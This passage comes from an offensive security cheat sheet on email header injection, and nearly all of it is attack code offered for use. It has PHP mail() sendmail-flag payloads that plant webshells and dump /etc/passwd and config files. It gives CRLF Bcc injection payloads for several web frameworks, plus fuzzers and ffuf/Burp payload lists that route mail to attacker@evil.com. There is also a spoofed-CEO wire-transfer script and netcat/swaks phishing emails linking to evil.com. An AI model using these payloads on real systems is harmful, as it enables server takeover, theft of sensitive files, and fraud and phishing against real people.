    -d "message=Welcome"
  ```

  :::

  :::tabs-item{icon="i-lucide-skull" label="RCE via 5th Parameter"}

  ::caution
  The 5th parameter of PHP `mail()` passes flags directly to the sendmail binary. The `-X` flag writes all mail traffic to a file, and `-O` sets options. This can achieve arbitrary file write leading to webshell deployment.
  ::

  ```bash
  # ---- Write PHP webshell via sendmail -X log ----

  # Basic webshell write
  curl -X POST http://target.com/contact.php \
    -d "email=a]@evil.com -OQueueDirectory=/tmp -X/var/www/html/shell.php" \
    -d "subject=<?php system(\$_GET['cmd']); ?>" \
    -d "message=test"

  # Access the webshell
  curl "http://target.com/shell.php?cmd=id"
  curl "http://target.com/shell.php?cmd=whoami"
  curl "http://target.com/shell.php?cmd=cat+/etc/passwd"
  curl "http://target.com/shell.php?cmd=uname+-a"

  # Stealthier webshell
  curl -X POST http://target.com/contact.php \
    -d "email=x]@evil.com -X/var/www/html/.config.php" \
    -d "subject=<?php @eval(\$_POST['x']); ?>" \
    -d "message=test"

  # Execute via POST
  curl -X POST "http://target.com/.config.php" \
    -d "x=system('ls -la /etc/');"

  # Alternative: Write to upload directory
  curl -X POST http://target.com/contact.php \
    -d "email=x]@evil.com -X/var/www/html/uploads/img.php" \
    -d "subject=<?php passthru(\$_REQUEST['c']); ?>" \
    -d "message=test"

  # ---- Read sensitive files via -C config include ----

  curl -X POST http://target.com/contact.php \
    -d "email=x]@evil.com -C/etc/passwd -X/var/www/html/passwd.txt" \
    -d "subject=test" \
    -d "message=test"

  # Read the dumped file
  curl http://target.com/passwd.txt

  # Dump application config
  curl -X POST http://target.com/contact.php \
    -d "email=x]@evil.com -C/var/www/html/config.php -X/var/www/html/config_dump.txt" \
    -d "subject=test" \
    -d "message=test"

  # ---- Alternative sendmail flags ----

  # -O flag to set mail options
  curl -X POST http://target.com/contact.php \
    -d "email=x]@evil.com -OQueueDirectory=/tmp -OLogLevel=999 -X/tmp/debug.log" \
    -d "subject=test" \
    -d "message=test"

  # Write to /tmp then use LFI to include
  curl -X POST http://target.com/contact.php \
    -d "email=x]@evil.com -X/tmp/evil.php" \
    -d "subject=<?php system(\$_GET['c']); ?>" \
    -d "message=test"

  # Chain with LFI
  curl "http://target.com/index.php?page=/tmp/evil"
  ```

  :::
::

### Python Framework Exploitation

::tabs
  :::tabs-item{icon="i-lucide-bug" label="Flask-Mail"}

  ```python
  # Vulnerable Flask-Mail pattern
  from flask import Flask, request
  from flask_mail import Mail, Message

  @app.route('/contact', methods=['POST'])
  def contact():
      msg = Message(
          subject=request.form['subject'],
          sender=request.form['email'],     # INJECTABLE
          recipients=['admin@target.com']
      )
      msg.body = request.form['message']
      mail.send(msg)
  ```

  ```bash
  # Exploit Flask-Mail
  curl -X POST http://target.com/contact \
    -d "email=attacker@evil.com%0d%0aBcc:victim@target.com" \
    -d "subject=Test" \
    -d "message=Hello"

  # JSON API variant
  curl -X POST http://target.com/api/contact \
    -H "Content-Type: application/json" \
    -d '{"email":"attacker@evil.com\r\nBcc:victim@target.com","subject":"Test","message":"Hello"}'

  # Unicode escape in JSON
  curl -X POST http://target.com/api/contact \
    -H "Content-Type: application/json" \
    -d '{"email":"attacker@evil.com\u000d\u000aBcc:victim@target.com","subject":"Test","message":"Hello"}'
  ```

  :::

  :::tabs-item{icon="i-lucide-bug" label="Django"}

  ```python
  # Vulnerable Django email pattern
  from django.core.mail import send_mail

  def contact_view(request):
      send_mail(
          request.POST['subject'],          # INJECTABLE
          request.POST['message'],
          request.POST['email'],            # INJECTABLE
          ['admin@target.com'],
      )
  ```

  ```bash
  # Exploit Django send_mail
  curl -X POST http://target.com/contact/ \
    -d "email=attacker@evil.com%0d%0aBcc:victim@target.com" \
    -d "subject=Test" \
    -d "message=Hello" \
    -d "csrfmiddlewaretoken=TOKEN_HERE"

  # Django EmailMessage with extra headers
  curl -X POST http://target.com/contact/ \
    -d "email=test@test.com%0d%0aCc:attacker@evil.com%0d%0aReply-To:attacker@evil.com" \
    -d "subject=Hello%0d%0aX-Priority:1" \
    -d "message=Urgent" \
    -d "csrfmiddlewaretoken=TOKEN_HERE"
  ```

  :::

  :::tabs-item{icon="i-lucide-bug" label="Raw smtplib"}

  ```python
  # Direct smtplib exploitation script
  import smtplib

  target_smtp = "mail.target.com"
  port = 25

  # Craft email with injected headers
  injected_email = (
      "From: ceo@target.com\r\n"
      "To: finance@target.com\r\n"
      "Bcc: attacker@evil.com\r\n"
      "Subject: Urgent Wire Transfer\r\n"
      "Content-Type: text/html\r\n"
      "X-Priority: 1\r\n"
      "Importance: High\r\n"
      "X-Mailer: Microsoft Outlook 16.0\r\n"
      "\r\n"
      "<html><body>"
      "<p>Please process immediately:</p>"
      "<ul><li>Amount: $50,000</li>"
      "<li>Account: 1234567890</li></ul>"
      "</body></html>"
  )

  try:
      s = smtplib.SMTP(target_smtp, port, timeout=10)
      s.ehlo()
      s.sendmail(
          'ceo@target.com',
          ['finance@target.com', 'attacker@evil.com'],
          injected_email
      )
      s.quit()
      print("[+] Injected email sent")
  except Exception as e:
      print(f"[-] Error: {e}")
  ```

  :::
::

### Node.js Exploitation

::code-collapse

```javascript
// ========================================
// Vulnerable Nodemailer Patterns
// ========================================

// Pattern 1: Direct user input in from/subject
const nodemailer = require('nodemailer');

app.post('/contact', async (req, res) => {
  let transporter = nodemailer.createTransport({
    host: 'smtp.target.com', port: 587
  });
  await transporter.sendMail({
    from: req.body.email,         // INJECTABLE
    to: 'admin@target.com',
    subject: req.body.subject,    // INJECTABLE
    text: req.body.message
  });
});

// Pattern 2: Custom headers from user input
app.post('/feedback', async (req, res) => {
  await transporter.sendMail({
    from: 'noreply@target.com',
    to: 'feedback@target.com',
    subject: 'Feedback from ' + req.body.name,  // INJECTABLE
    replyTo: req.body.email,                     // INJECTABLE
    text: req.body.message
  });
});

// ========================================
// Exploitation Commands
// ========================================

// Inject via email field
// curl -X POST http://target.com/contact \
//   -H "Content-Type: application/json" \
//   -d '{"email":"attacker@evil.com\r\nBcc:victim@target.com","subject":"Hi","message":"Test"}'

// Inject via subject field
// curl -X POST http://target.com/contact \
//   -H "Content-Type: application/json" \
//   -d '{"email":"test@test.com","subject":"Hi\r\nBcc:attacker@evil.com","message":"Test"}'

// Full hijack via JSON
// curl -X POST http://target.com/contact \
//   -H "Content-Type: application/json" \
//   -d '{"email":"ceo@target.com\r\nTo:allstaff@target.com\r\nSubject:Mandatory Update\r\nContent-Type:text/html\r\n\r\n<p>Install: <a href=\"http://evil.com\">Download</a></p>","subject":"x","message":"x"}'

// Name field injection
// curl -X POST http://target.com/feedback \
//   -H "Content-Type: application/json" \
//   -d '{"name":"User\r\nBcc:attacker@evil.com","email":"test@test.com","message":"Feedback"}'
```

::

### Ruby / Rails Exploitation

::code-collapse

```ruby
# ========================================
# Vulnerable Ruby Patterns
# ========================================

# Pattern 1: Raw Net::SMTP
require 'net/smtp'

def send_contact(email, subject, body)
  message = <<~MSG
    From: #{email}
    To: admin@target.com
    Subject: #{subject}

    #{body}
  MSG
  Net::SMTP.start('localhost', 25) do |smtp|
    smtp.send_message message, email, 'admin@target.com'
  end
end

# Pattern 2: Rails ActionMailer
class ContactMailer < ApplicationMailer
  def send_contact(params)
    mail(
      from: params[:email],       # INJECTABLE
      to: 'admin@target.com',
      subject: params[:subject],  # INJECTABLE
      body: params[:message]
    )
  end
end

# ========================================
# Exploitation Commands
# ========================================

# Basic Bcc injection
# curl -X POST http://target.com/contact \
#   -d "contact[email]=attacker@evil.com%0d%0aBcc:victim@target.com" \
#   -d "contact[subject]=Hello" \
#   -d "contact[message]=Test" \
#   -d "authenticity_token=TOKEN"

# Subject injection
# curl -X POST http://target.com/contact \
#   -d "contact[email]=test@test.com" \
#   -d "contact[subject]=Hello%0d%0aBcc:attacker@evil.com" \
#   -d "contact[message]=Test" \
#   -d "authenticity_token=TOKEN"

# Full override
# curl -X POST http://target.com/contact \
#   -d "contact[email]=admin@target.com%0d%0aBcc:all@target.com%0d%0aSubject:Security Update%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>Update Required</h1>" \
#   -d "contact[subject]=x" \
#   -d "contact[message]=x" \
#   -d "authenticity_token=TOKEN"
```

::

### Java / Spring Exploitation

::code-collapse

```java
// ========================================
// Vulnerable Java Patterns
// ========================================

// Pattern 1: SimpleMailMessage
@PostMapping("/contact")
public String send(@RequestParam String email,
                   @RequestParam String subject,
                   @RequestParam String message) {
    SimpleMailMessage msg = new SimpleMailMessage();
    msg.setFrom(email);             // INJECTABLE
    msg.setTo("admin@target.com");
    msg.setSubject(subject);        // INJECTABLE
    msg.setText(message);
    mailSender.send(msg);
    return "sent";
}

// Pattern 2: MimeMessage with user input
@PostMapping("/contact")
public String send(@RequestParam String email,
                   @RequestParam String subject,
                   @RequestParam String body) {
    MimeMessage msg = mailSender.createMimeMessage();
    msg.setFrom(new InternetAddress(email));    // INJECTABLE
    msg.setSubject(subject);                    // INJECTABLE
    msg.setRecipient(Message.RecipientType.TO,
        new InternetAddress("admin@target.com"));
    msg.setText(body);
    Transport.send(msg);
    return "sent";
}

// ========================================
// Exploitation Commands
// ========================================

// Basic injection
// curl -X POST http://target.com/contact \
//   -d "email=attacker@evil.com%0d%0aBcc:victim@target.com" \
//   -d "subject=Hello" \
//   -d "message=Test"

// Subject injection
// curl -X POST http://target.com/contact \
//   -d "email=test@test.com" \
//   -d "subject=Hello%0d%0aBcc:attacker@evil.com" \
//   -d "message=Test"

// Spring Boot API
// curl -X POST http://target.com/api/contact \
//   -H "Content-Type: application/json" \
//   -d '{"email":"test@test.com\r\nBcc:attacker@evil.com","subject":"Test","message":"Hello"}'
```

::

### Go Exploitation

::code-collapse

```go
// ========================================
// Vulnerable Go Pattern
// ========================================

package main

import (
    "net/smtp"
    "net/http"
    "fmt"
)

func contactHandler(w http.ResponseWriter, r *http.Request) {
    from := r.FormValue("email")      // INJECTABLE
    subject := r.FormValue("subject") // INJECTABLE
    body := r.FormValue("message")

    // String concatenation — vulnerable to injection
    msg := fmt.Sprintf(
        "From: %s\r\nTo: admin@target.com\r\nSubject: %s\r\n\r\n%s",
        from, subject, body,
    )

    smtp.SendMail("smtp.target.com:25", nil, from,
        []string{"admin@target.com"}, []byte(msg))

    fmt.Fprintf(w, "Sent")
}

// Exploitation:
// curl -X POST http://target.com/contact \
//   -d "email=test@test.com%0d%0aBcc:attacker@evil.com" \
//   -d "subject=Hello" \
//   -d "message=Test"
//
// curl -X POST http://target.com/contact \
//   -d "email=test@test.com" \
//   -d "subject=Hello%0d%0aBcc:attacker@evil.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>Injected</h1>" \
//   -d "message=Ignored"
```

::

---

## Automated Fuzzing & Scanning

### Comprehensive Fuzzer

::code-group

```bash [Bash Fuzzer]
#!/bin/bash
# ================================================
# Email Header Injection Comprehensive Fuzzer
# ================================================

TARGET="http://target.com/contact"
CALLBACK_DOMAIN="evil.com"   # Your controlled domain
CALLBACK_EMAIL="catch@${CALLBACK_DOMAIN}"
LOG_FILE="/tmp/email_inject_results.log"

echo "[*] Email Header Injection Fuzzer" | tee $LOG_FILE
echo "[*] Target: $TARGET" | tee -a $LOG_FILE
echo "[*] Callback: $CALLBACK_EMAIL" | tee -a $LOG_FILE
echo "========================================" | tee -a $LOG_FILE

# Payload array — newline variations
NEWLINE_PAYLOADS=(
  "%0d%0a"
  "%0a"
  "%0d"
  "%250d%250a"
  "%25250d%25250a"
  "%0d%250a"
  "%250d%0a"
  "%C0%8D%C0%8A"
  "%E0%80%8D%E0%80%8A"
  "%C2%85"
  "%E2%80%A8"
  "%E2%80%A9"
  "%0b"
  "%0c"
  "%00%0d%0a"
  "%0d%00%0a"
  "%0d%0a%20"
  "%0d%0a%09"
)

# Header injection targets
HEADERS=(
  "Bcc:${CALLBACK_EMAIL}"
  "Cc:${CALLBACK_EMAIL}"
  "To:${CALLBACK_EMAIL}"
  "Reply-To:${CALLBACK_EMAIL}"
  "From:spoofed@target.com"
  "Subject:INJECTED_SUBJECT"
)

# Input field names to test
FIELDS=("email" "name" "subject" "from" "sender" "reply_to" "replyto" "contact_email")

COUNTER=0
for field in "${FIELDS[@]}"; do
  for newline in "${NEWLINE_PAYLOADS[@]}"; do
    for header in "${HEADERS[@]}"; do
      COUNTER=$((COUNTER + 1))
      PAYLOAD="test${newline}${header}"

      RESPONSE=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}:%{time_total}" \
        -X POST "$TARGET" \
        -d "${field}=${PAYLOAD}" \
        -d "message=fuzz_test_${COUNTER}" \
        --max-time 15 2>/dev/null)

      HTTP_CODE=$(echo $RESPONSE | cut -d: -f1)
      SIZE=$(echo $RESPONSE | cut -d: -f2)
      TIME=$(echo $RESPONSE | cut -d: -f3)

      if [[ "$HTTP_CODE" == "200" || "$HTTP_CODE" == "302" ]]; then
        STATUS="[POSSIBLE]"
      elif [[ "$HTTP_CODE" == "500" ]]; then
        STATUS="[ERROR]"
      else
        STATUS="[${HTTP_CODE}]"
      fi

      echo "${STATUS} #${COUNTER} Field:${field} NL:${newline} HDR:${header} Code:${HTTP_CODE} Size:${SIZE} Time:${TIME}s" | tee -a $LOG_FILE
    done
  done
done

echo "========================================" | tee -a $LOG_FILE
echo "[*] Total tests: $COUNTER" | tee -a $LOG_FILE
echo "[*] Results saved: $LOG_FILE" | tee -a $LOG_FILE
echo "[*] Check your email server for received messages" | tee -a $LOG_FILE
```

```python [Python Advanced Fuzzer]
#!/usr/bin/env python3
"""
Email Header Injection Advanced Fuzzer
Supports form-encoded and JSON endpoints
Includes response analysis and OOB detection
"""

import requests
import time
import sys
import uuid
import itertools
import urllib.parse
import json

class EmailHeaderFuzzer:
    def __init__(self, target_url, callback_email, content_type="form"):
        self.target = target_url
        self.callback = callback_email
        self.content_type = content_type
        self.results = []
        self.session = requests.Session()

    def get_newline_payloads(self):
        return [
            "\r\n",
            "\n",
            "\r",
            "%0d%0a",
            "%0a",
            "%0d",
            "%250d%250a",
            "%250d%0a",
            "%0d%250a",
            "\r\n ",
            "\r\n\t",
            "\x0b",
            "\x0c",
            "\x00\r\n",
            "\u0085",
            "\u2028",
            "\u2029",
            "\xc0\x8d\xc0\x8a",
        ]

    def get_header_payloads(self):
        uid = uuid.uuid4().hex[:8]
        return [
            f"Bcc:{self.callback}",
            f"Cc:{self.callback}",
            f"To:{self.callback}",
            f"Reply-To:{self.callback}",
            f"From:spoofed-{uid}@target.com",
            f"Subject:INJECTED-{uid}",
            f"Bcc:{self.callback}\r\nSubject:INJECTED-{uid}",
            f"Content-Type:text/html\r\n\r\n<h1>INJECTED-{uid}</h1>",
            f"X-Priority:1\r\nBcc:{self.callback}",
            f"Bcc:{self.callback}\r\nReply-To:{self.callback}",
        ]

    def get_fields(self):
        return [
            "email", "name", "subject", "from",
            "sender", "reply_to", "replyto",
            "contact_email", "user_email", "from_email",
            "sender_email", "reply", "feedback_email"
        ]

    def send_form(self, field, payload):
        data = {
            "email": "test@test.com",
            "name": "Test User",
            "subject": "Test Subject",
            "message": f"fuzz-{uuid.uuid4().hex[:8]}"
        }
        data[field] = f"test{payload}"
        return self.session.post(self.target, data=data, timeout=15)

    def send_json(self, field, payload):
        data = {
            "email": "test@test.com",
            "name": "Test User",
            "subject": "Test Subject",
            "message": f"fuzz-{uuid.uuid4().hex[:8]}"
        }
        data[field] = f"test{payload}"
        return self.session.post(
            self.target,
            json=data,
            headers={"Content-Type": "application/json"},
            timeout=15
        )

    def fuzz(self):
        newlines = self.get_newline_payloads()
        headers = self.get_header_payloads()
        fields = self.get_fields()
        total = len(fields) * len(newlines) * len(headers)
        count = 0

        print(f"[*] Starting fuzzer against {self.target}")
        print(f"[*] Total combinations: {total}")
        print(f"[*] Callback: {self.callback}")
        print("=" * 60)

        for field in fields:
            for nl in newlines:
                for hdr in headers:
                    count += 1
                    payload = f"{nl}{hdr}"
                    try:
                        if self.content_type == "json":
                            r = self.send_json(field, payload)
                        else:
                            r = self.send_form(field, payload)

                        result = {
                            "id": count,
                            "field": field,
                            "newline": repr(nl),
                            "header": hdr.split(":")[0],
                            "status": r.status_code,
                            "length": len(r.text),
                        }
                        self.results.append(result)

                        tag = "INTERESTING" if r.status_code in [200, 302] else "CHECK"
                        print(f"[{tag}] #{count}/{total} "
                              f"Field:{field} "
                              f"NL:{repr(nl)[:20]} "
                              f"HDR:{hdr[:30]} "
                              f"Status:{r.status_code} "
                              f"Len:{len(r.text)}")

                    except Exception as e:
                        print(f"[ERROR] #{count}/{total} Field:{field} - {str(e)[:50]}")

                    time.sleep(0.3)

        self.print_summary()

    def print_summary(self):
        print("\n" + "=" * 60)
        print("[*] SUMMARY")
        successful = [r for r in self.results if r["status"] in [200, 302]]
        print(f"[*] Potentially successful: {len(successful)}/{len(self.results)}")
        for r in successful[:20]:
            print(f"    #{r['id']} Field:{r['field']} NL:{r['newline'][:15]} HDR:{r['header']}")
        print("[*] Check callback email for received messages")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target_url> <callback_email> [form|json]")
        sys.exit(1)

    target = sys.argv[1]
    callback = sys.argv[2]
    ctype = sys.argv[3] if len(sys.argv) > 3 else "form"

    fuzzer = EmailHeaderFuzzer(target, callback, ctype)
    fuzzer.fuzz()
```

```bash [ffuf Payloads & Commands]
# ================================================
# Generate comprehensive payload wordlist
# ================================================

cat > /tmp/email_hdr_inject.txt << 'PAYLOADS'
%0d%0aBcc:CALLBACK
%0aBcc:CALLBACK
%0dBcc:CALLBACK
%250d%250aBcc:CALLBACK
%25250d%25250aBcc:CALLBACK
%250d%0aBcc:CALLBACK
%0d%250aBcc:CALLBACK
%C0%8D%C0%8ABcc:CALLBACK
%E0%80%8D%E0%80%8ABcc:CALLBACK
%C2%85Bcc:CALLBACK
%E2%80%A8Bcc:CALLBACK
%E2%80%A9Bcc:CALLBACK
%0bBcc:CALLBACK
%0cBcc:CALLBACK
%00%0d%0aBcc:CALLBACK
%0d%00%0aBcc:CALLBACK
%0d%0a%20Bcc:CALLBACK
%0d%0a%09Bcc:CALLBACK
%0d%0aCc:CALLBACK
%0d%0aTo:CALLBACK
%0d%0aReply-To:CALLBACK
%0d%0abcc:CALLBACK
%0d%0aBCC:CALLBACK
%0d%0abCc:CALLBACK
%0d%0aBcc:%20CALLBACK
%0d%0aBcc:%09CALLBACK
%0d%0aBcc:(comment)CALLBACK
%0d%0a%20Bcc:CALLBACK
%0d%0aBcc:CALLBACK%0d%0aSubject:INJECTED
%0d%0aBcc:CALLBACK%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>INJECT</h1>
%0d%0aX-Priority:1%0d%0aBcc:CALLBACK
PAYLOADS

# Replace CALLBACK with actual email
sed -i 's/CALLBACK/attacker@evil.com/g' /tmp/email_hdr_inject.txt

# ---- ffuf against email field ----
ffuf -u http://target.com/contact \
  -X POST \
  -d "email=testFUZZ&subject=test&message=test" \
  -w /tmp/email_hdr_inject.txt \
  -mc all -fc 400,403 \
  -t 5 -rate 10 \
  -o /tmp/ffuf_email.json

# ---- ffuf against name field ----
ffuf -u http://target.com/contact \
  -X POST \
  -d "email=test@test.com&name=testFUZZ&subject=test&message=test" \
  -w /tmp/email_hdr_inject.txt \
  -mc all -fc 400,403 \
  -t 5 -rate 10 \
  -o /tmp/ffuf_name.json

# ---- ffuf against subject field ----
ffuf -u http://target.com/contact \
  -X POST \
  -d "email=test@test.com&subject=testFUZZ&message=test" \
  -w /tmp/email_hdr_inject.txt \
  -mc all -fc 400,403 \
  -t 5 -rate 10 \
  -o /tmp/ffuf_subject.json

# ---- ffuf against JSON API ----
ffuf -u http://target.com/api/contact \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"testFUZZ","subject":"test","message":"test"}' \
  -w /tmp/email_hdr_inject.txt \
  -mc all -fc 400,403 \
  -t 5 -rate 10 \
  -o /tmp/ffuf_api.json

# ---- Analyze results ----
cat /tmp/ffuf_email.json | jq '.results[] | select(.status == 200) | {input: .input.FUZZ, status: .status, length: .length}'
```

::

### Burp Suite Methodology

::accordion
  :::accordion-item{icon="i-lucide-search" label="Intercept & Identify"}

  ```
  # =============================================
  # Step 1: Capture email-sending request
  # =============================================

  # Enable Proxy Intercept
  # Submit the contact/feedback/subscribe form
  # Captured request example:

  POST /contact HTTP/1.1
  Host: target.com
  Content-Type: application/x-www-form-urlencoded
  Cookie: session=abc123

  email=user@test.com&name=John&subject=Hello&message=Test+message

  # Note all parameters that could flow into email headers:
  # - email → likely From or Reply-To
  # - name → likely From display name or X-Sender-Name
  # - subject → likely Subject header
  ```

  :::

  :::accordion-item{icon="i-lucide-repeat" label="Repeater Testing"}

  ```
  # =============================================
  # Step 2: Send to Repeater and test each field
  # =============================================

  # Test 1: email field — standard CRLF
  POST /contact HTTP/1.1
  Host: target.com
  Content-Type: application/x-www-form-urlencoded

  email=user@test.com%0d%0aBcc:attacker@evil.com&name=John&subject=Hello&message=Test

  # Test 2: email field — LF only
  email=user@test.com%0aBcc:attacker@evil.com&name=John&subject=Hello&message=Test

  # Test 3: name field — CRLF
  email=user@test.com&name=John%0d%0aBcc:attacker@evil.com&subject=Hello&message=Test

  # Test 4: subject field — CRLF
  email=user@test.com&name=John&subject=Hello%0d%0aBcc:attacker@evil.com&message=Test

  # Test 5: double encoded
  email=user@test.com%250d%250aBcc:attacker@evil.com&name=John&subject=Hello&message=Test

  # Test 6: JSON API variant
  POST /api/contact HTTP/1.1
  Host: target.com
  Content-Type: application/json

  {"email":"user@test.com\r\nBcc:attacker@evil.com","name":"John","subject":"Hello","message":"Test"}

  # =============================================
  # Compare response codes, lengths, timing
  # Successful injection typically returns same
  # response as normal request
  # =============================================
  ```

  :::

  :::accordion-item{icon="i-lucide-target" label="Intruder Configuration"}

  ```
  # =============================================
  # Step 3: Automated testing via Intruder
  # =============================================

  # Attack Type: Sniper
  # Request Template:
  POST /contact HTTP/1.1
  Host: target.com
  Content-Type: application/x-www-form-urlencoded

  email=user@test.com§INJECT§&name=John&subject=Hello&message=Test

  # Payload List:
  %0d%0aBcc:attacker@evil.com
  %0aBcc:attacker@evil.com
  %0dBcc:attacker@evil.com
  %250d%250aBcc:attacker@evil.com
  %0d%0aCc:attacker@evil.com
  %0d%0aTo:attacker@evil.com
  %0d%0aReply-To:attacker@evil.com
  %C0%8D%C0%8ABcc:attacker@evil.com
  %E2%80%A8Bcc:attacker@evil.com
  %00%0d%0aBcc:attacker@evil.com
  %0d%0a%20Bcc:attacker@evil.com
  %0d%0a%09Bcc:attacker@evil.com

  # Grep Match (in Options):
  # - "sent"
  # - "success"
  # - "thank"
  # - "received"

  # Grep Extract:
  # - Full response body for differential analysis
  ```

  :::

  :::accordion-item{icon="i-lucide-radio" label="Collaborator Verification"}

  ```
  # =============================================
  # Step 4: Confirm with Burp Collaborator
  # =============================================

  # Generate Collaborator payload:
  # abc123.burpcollaborator.net

  # Inject as Bcc recipient:
  email=user@test.com%0d%0aBcc:abc123.burpcollaborator.net&subject=test&message=test

  # Inject as To recipient:
  email=user@test.com%0d%0aTo:abc123.burpcollaborator.net&subject=test&message=test

  # Check Collaborator tab for:
  # - SMTP interactions (email delivered)
  # - DNS interactions (MX lookup for collaborator domain)

  # If SMTP interaction received → CONFIRMED VULNERABLE
  # If only DNS interaction → mail server attempted delivery
  ```

  :::
::

---

## SMTP Direct Interaction

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Telnet Manual Testing"}

  ```bash
  # ---- Connect and enumerate SMTP capabilities ----
  telnet target.com 25

  EHLO attacker.com
  # Look for: VRFY, EXPN, SIZE, AUTH, STARTTLS

  # ---- Test open relay ----
  MAIL FROM:<test@attacker.com>
  RCPT TO:<external@gmail.com>
  # If accepted → open relay

  # ---- Send spoofed email with injected headers ----
  MAIL FROM:<attacker@evil.com>
  RCPT TO:<admin@target.com>
  RCPT TO:<victim@target.com>
  DATA
  From: ceo@target.com
  To: admin@target.com
  Bcc: victim@target.com
  Cc: attacker@evil.com
  Subject: Urgent: Account Review Required
  Content-Type: text/html
  MIME-Version: 1.0
  X-Priority: 1
  Importance: High
  X-Mailer: Microsoft Outlook 16.0

  <html>
  <body style="font-family:Calibri,Arial,sans-serif">
  <h2 style="color:#cc0000">Security Notice</h2>
  <p>Your account requires immediate verification due to suspicious activity.</p>
  <p><a href="http://evil.com/verify" style="background:#0066cc;color:white;padding:10px 20px;text-decoration:none">Verify Account</a></p>
  <br>
  <p>IT Security Department<br>target.com</p>
  </body>
  </html>
  .
  QUIT

  # ---- VRFY user enumeration ----
  VRFY admin
  VRFY root
  VRFY postmaster
  VRFY info
  VRFY support

  # ---- EXPN mailing list expansion ----
  EXPN staff
  EXPN all
  EXPN admin
  ```

  :::

  :::tabs-item{icon="i-lucide-terminal" label="Netcat Direct SMTP"}

  ```bash
  # Basic email send via netcat
  nc -C target.com 25 << 'SMTP'
  EHLO evil.com
  MAIL FROM:<attacker@evil.com>
  RCPT TO:<admin@target.com>
  DATA
  From: security@target.com
  To: admin@target.com
  Bcc: attacker@evil.com
  Subject: Password Expiration Notice
  Content-Type: text/plain

  Your domain password expires in 24 hours.
  Reset here: http://evil.com/reset

  IT Department
  .
  QUIT
  SMTP

  # Open relay test via netcat
  nc -C target.com 25 << 'RELAY'
  EHLO test.com
  MAIL FROM:<test@test.com>
  RCPT TO:<external@gmail.com>
  DATA
  From: test@test.com
  To: external@gmail.com
  Subject: Relay Test

  If you receive this, the server is an open relay.
  .
  QUIT
  RELAY

  # SSL/TLS SMTP via openssl
  openssl s_client -connect target.com:465 -quiet << 'SMTPS'
  EHLO evil.com
  MAIL FROM:<attacker@evil.com>
  RCPT TO:<admin@target.com>
  DATA
  From: admin@target.com
  To: admin@target.com
  Bcc: attacker@evil.com
  Subject: Encrypted Channel Test

  Sent via TLS connection.
  .
  QUIT
  SMTPS

  # STARTTLS via openssl
  openssl s_client -starttls smtp -connect target.com:587 -quiet << 'STARTTLS'
  EHLO evil.com
  MAIL FROM:<attacker@evil.com>
  RCPT TO:<admin@target.com>
  DATA
  From: admin@target.com
  To: admin@target.com
  Subject: STARTTLS Test

  Sent via STARTTLS.
  .
  QUIT
  STARTTLS
  ```

  :::

  :::tabs-item{icon="i-lucide-send" label="swaks Advanced Usage"}

  ```bash
  # ---- Basic header injection ----
  swaks --to admin@target.com \
    --from attacker@evil.com \
    --header "Bcc: victim@target.com" \
    --server target.com:25 \
    --body "Header injection test"

  # ---- Multi-header injection ----
  swaks --to admin@target.com \
    --from ceo@target.com \
    --header "Bcc: victim1@target.com" \
    --header "Bcc: victim2@target.com" \
    --header "Cc: attacker@evil.com" \
    --header "Reply-To: attacker@evil.com" \
    --header "X-Priority: 1" \
    --header "Importance: High" \
    --header "X-MSMail-Priority: High" \
    --header "X-Mailer: Microsoft Outlook 16.0" \
    --server target.com:25

  # ---- HTML phishing email ----
  swaks --to admin@target.com \
    --from it-security@target.com \
    --header "Content-Type: text/html" \
    --header "Bcc: allusers@target.com" \
    --header "Subject: Mandatory Security Update" \
    --server target.com:25 \
    --body '<html><body style="font-family:Arial"><h2>Security Update Required</h2><p>Install the mandatory patch:</p><a href="http://evil.com/update" style="background:#0066cc;color:white;padding:10px 20px;text-decoration:none;border-radius:4px">Install Update</a><br><br><small>IT Security Team</small></body></html>'

  # ---- Authenticated SMTP ----
  swaks --to admin@target.com \
    --from compromised@target.com \
    --header "Bcc: attacker@evil.com" \
    --server smtp.target.com:587 \
    --auth LOGIN \
    --auth-user "compromised@target.com" \
    --auth-password "password123" \
    --tls

  # ---- With file attachment ----
  swaks --to admin@target.com \
    --from hr@target.com \
    --header "Bcc: allstaff@target.com" \
    --header "Subject: Q4 Bonus Information" \
    --server target.com:25 \
    --attach /tmp/payload.pdf \
    --body "Please review the attached bonus details."

  # ---- Open relay test ----
  swaks --to external@gmail.com \
    --from test@target.com \
    --server target.com:25 \
    --body "Open relay test"

  # ---- SMTP enumeration ----
  swaks --to admin@target.com \
    --from test@test.com \
    --server target.com:25 \
    --quit-after RCPT \
    --hide-all

  # ---- TLS on connect (port 465) ----
  swaks --to admin@target.com \
    --from attacker@evil.com \
    --header "Bcc: victim@target.com" \
    --server target.com:465 \
    --tlsc \
    --body "Secure injection test"

  # ---- Pipeline mode ----
  swaks --to admin@target.com \
    --from attacker@evil.com \
    --server target.com:25 \
    --pipeline \
    --header "Bcc: victim@target.com"

  # ---- Custom EHLO/HELO ----
  swaks --to admin@target.com \
    --from attacker@evil.com \
    --server target.com:25 \
    --ehlo legitimate-server.target.com \
    --header "Bcc: victim@target.com"
  ```

  :::
::

---

## Nmap SMTP Reconnaissance

::code-collapse

```bash
# ================================================
# Nmap SMTP Enumeration & Vulnerability Scanning
# ================================================

# ---- Service detection ----
nmap -sV -p 25,465,587,2525 target.com -oA smtp_service

# ---- All SMTP scripts ----
nmap --script="smtp-*" -p 25,465,587 target.com -oA smtp_full

# ---- SMTP command enumeration ----
nmap --script smtp-commands -p 25,465,587 target.com

# ---- Open relay detection ----
nmap --script smtp-open-relay -p 25 target.com
nmap --script smtp-open-relay --script-args smtp-open-relay.from="test@evil.com",smtp-open-relay.to="test@gmail.com" -p 25 target.com

# ---- User enumeration via VRFY ----
nmap --script smtp-enum-users --script-args smtp-enum-users.methods=VRFY -p 25 target.com

# ---- User enumeration via EXPN ----
nmap --script smtp-enum-users --script-args smtp-enum-users.methods=EXPN -p 25 target.com

# ---- User enumeration via RCPT ----
nmap --script smtp-enum-users --script-args smtp-enum-users.methods=RCPT -p 25 target.com

# ---- All enumeration methods ----
nmap --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -p 25 target.com

# ---- SMTP vulnerability check ----
nmap --script smtp-vuln* -p 25,465,587 target.com

